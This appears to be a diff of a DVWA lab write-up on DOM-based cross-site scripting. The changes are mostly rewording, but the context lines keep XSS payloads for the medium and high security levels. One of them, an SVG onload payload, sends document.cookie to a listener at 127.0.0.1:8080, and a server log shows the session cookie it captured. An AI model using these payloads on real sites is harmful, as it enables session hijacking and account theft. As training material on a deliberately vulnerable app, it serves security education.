@@ -78,8 +78,6 @@ The DVWA server has **4 different security levels** which can be set as seen bel
     $ python3 -m http.server 8080
     Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
     127.0.0.1 - - [16/Dec/2023 18:46:37] "GET /?cookie=security=low;%20PHPSESSID=fejtgct45j1cmkcedvieacnai5 HTTP/1.1" 200 -
-    127.0.0.1 - - [16/Dec/2023 18:46:37] code 404, message File not found
-    127.0.0.1 - - [16/Dec/2023 18:46:37] "GET /favicon.ico HTTP/1.1" 404 -
     ```
 
 ## Security: Medium
@@ -93,7 +91,7 @@ The DVWA server has **4 different security levels** which can be set as seen bel
 
     ![](medium_payload_fail.png)
 
-2. The payload does not get replaced, but it does seem to work either. If we take a look at the page's source code, we will see a `select` statement, and if we escape that by changing the payload, it will work:
+2. The payload does not get replaced, but it does seem to work either. If we take a look at the page's source code, we will see a `select` statement, and if we escape that by modifying a bit our payload, it will work:
 
     ![](medium_page_source.png)
 
@@ -103,7 +101,7 @@ The DVWA server has **4 different security levels** which can be set as seen bel
 
     ![](medium_payload.png)
 
-3. We can use the same process we used at the previous level to steal our target's cookie:
+3. We can use the same process as before to steal our target's cookie:
 
     ```javascript
     </select><svg/onload=window.location='http://127.0.0.1:8080/?cookie='+document.cookie>
@@ -120,7 +118,7 @@ The DVWA server has **4 different security levels** which can be set as seen bel
 ## Security: High
 > _The developer is now white listing only the allowed languages, you must find a way to run your code without it going to the server ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/xss_dom/xss_dom_high_source.php))._
 
-1. On this level, the developer has a whitelist allowing only a set of predefined languages; anything else is replaced with `?default=English`. So what happens is that when we sent the GET request with our payload, it gets replaced with `?default=English` and redirected with a new GET request:
+1. On this level, the developer has a whitelist allowing only a set of predefined languages; anything else is replaced with `?default=English`. What happens here is that when we sent the GET request that has our payload, it gets redirected to a new GET request with `?default=English`:
 
     ```javascript
     127.0.0.1:42001/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
